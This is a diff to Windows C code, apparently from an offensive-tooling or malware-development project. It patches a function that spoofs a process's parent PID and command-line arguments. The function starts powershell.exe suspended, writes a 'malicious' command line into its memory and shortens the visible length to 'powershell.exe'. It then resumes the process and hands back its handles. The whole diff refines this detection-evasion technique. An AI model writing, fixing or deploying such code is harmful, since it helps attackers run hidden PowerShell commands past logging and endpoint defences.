@@ -915,6 +915,7 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 	ULONG						 ulRetren				  = 0;
 	SIZE_T						 sThreadAttributeListSize = 0,
 								 sConvertedBytes		  = 0;
+	NTSTATUS					 ntStatus				  = 0;
 	STARTUPINFOEXW				 StartupInfoEx_t		  = { .StartupInfo.cb = sizeof(STARTUPINFOEXW) };
 	PROCESS_INFORMATION          ProcessInformation_t	  = { 0 };
 	PROCESS_BASIC_INFORMATION	 ProcessBasicInfoBlock_t  = { 0 };
@@ -937,7 +938,7 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 
 	StartupInfoEx_t.lpAttributeList = pThreadsAttributeList_t;
 
-	pSpoofedProcessPath[10] = 0x5C; // L'\\'
+	pSpoofedProcessPath[lstrlenW(pSpoofedProcessPath)] = 0x5C; // L'\\'
 
 	if (mbstowcs_s(&sConvertedBytes, pSpoofedSubDirectory, MAX_PATH, pTargetSpoofedPathName, MAX_PATH) || sConvertedBytes != 1 + strlen(pTargetSpoofedPathName)) goto EndOfFunc;
 
@@ -945,9 +946,11 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 
 	wcscat_s(pSpoofedProcessPath, MAX_PATH, pSpoofedSubDirectory);
 
-	pSpoofedProcessPath[19] = 0x5C; // L'\\'
+	SIZE_T Index = lstrlenW(pSpoofedProcessPath);
+	
+	pSpoofedProcessPath[Index] = 0x5C; // L'\\'
 
-	pSpoofedProcessPath[20] = 0x0;
+	pSpoofedProcessPath[Index + 1] = 0x0;
 
 	if (!CreateProcessW(
 		L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", pSpoofedCommandLine,
@@ -959,7 +962,7 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 		printf("CreateProcessW Failed With Error: 0x%lx", GetLastError());
 		goto EndOfFunc;
 	}
-	NTSTATUS ntStatus = 0;
+
 	if ((ntStatus = NtQueryProcInfo(
 		ProcessInformation_t.hProcess,
 		ProcessBasicInformation,
@@ -985,7 +988,7 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 		(PVOID)pMaliciousCommandLine, (DWORD)(lstrlenW(pMaliciousCommandLine) * sizeof(WCHAR) + 1)
 	)) goto EndOfFunc;
 
-	DWORD dwNewLen = 30;
+	DWORD dwNewLen = sizeof(L"powershell.exe");
 
 	if (!WriteToTargetProcess(
 		ProcessInformation_t.hProcess,
@@ -994,6 +997,13 @@ BOOLEAN SpoofProcessCLA_PPID //CLA = Command Line Argument | PPID = Parent Proce
 		sizeof(DWORD))) goto EndOfFunc;
 
 	ResumeThread(ProcessInformation_t.hThread);
+
+	if (!ProcessInformation_t.dwProcessId || !ProcessInformation_t.dwThreadId|| !ProcessInformation_t.hProcess|| !ProcessInformation_t.hThread) goto EndOfFunc;
+
+	*phMalicousThreadHandle   = ProcessInformation_t.hThread;
+	*pdwMaliciousThreadId     = ProcessInformation_t.dwThreadId;
+	*phMaliciousProcessHandle = ProcessInformation_t.hProcess;
+	*pdwMaliciousProcessId    = ProcessInformation_t.dwProcessId;
 
 	bState = TRUE;
 
